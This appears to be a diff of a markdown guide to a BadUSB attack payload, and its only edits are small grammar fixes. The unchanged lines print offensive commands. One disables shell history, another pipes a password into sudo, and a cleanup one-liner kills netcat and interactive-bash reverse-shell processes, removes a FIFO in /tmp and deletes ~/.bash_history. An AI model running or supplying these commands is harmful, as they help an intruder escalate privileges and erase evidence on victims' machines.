@@ -57,7 +57,7 @@ The BadUSB Payload:
     
     `unset HISTFILE; set +o history && echo "password" | sudo -S whoami` 
     
-- **Root Access:** After Switching to root execute this for not logging commands.
+- **Root Access:** After Switching to root execute this for not logging the commands.
     
     `unset HISTFILE`
     
@@ -68,7 +68,7 @@ The BadUSB Payload:
 
 **Objective:** Remove traces of the reverse shell session and terminate gracefully.
 
-- **Command for cleanup processes that related to reverse shell:**
+- **Command for cleanup processes that are related to reverse shell:**
 
 `nohup bash -c 'screen -S upd_check -X quit; sleep 3; screen -wipe; pkill -f "nc -l 9123"; ps aux | grep "[b]ash -i" | grep -v grep | awk "{print \$2}" | xargs -r kill -9; rm -f /tmp/f; rm -f ~/.bash_history' > /dev/null 2>&1 &`
 
